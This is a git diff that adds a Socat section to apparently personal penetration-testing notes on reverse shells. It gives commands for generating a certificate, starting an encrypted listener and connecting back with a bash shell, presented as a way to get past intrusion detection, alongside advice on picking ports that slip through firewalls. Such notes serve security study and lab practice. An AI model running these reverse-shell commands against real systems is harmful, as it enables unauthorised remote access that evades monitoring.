@@ -10,6 +10,24 @@ nc -lvnp <port-number>
 Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.
 
 ## Socat
+Although, it is same as netcat, but the real difference for which we would prefer this is encrypted shells. This often bypasses IDS system.
+
+We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:
+```bash
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+```
+We then need to merge the two created files into a single .pem file:
+```bash
+cat shell.key shell.crt > shell.pem
+```
+Now, when we set up our reverse shell listener, we use below command to listen on a port:
+```bash
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+```
+To connect back, we would use:
+```bash
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+```
 
 ## Shell Stablize
 ### Using Python
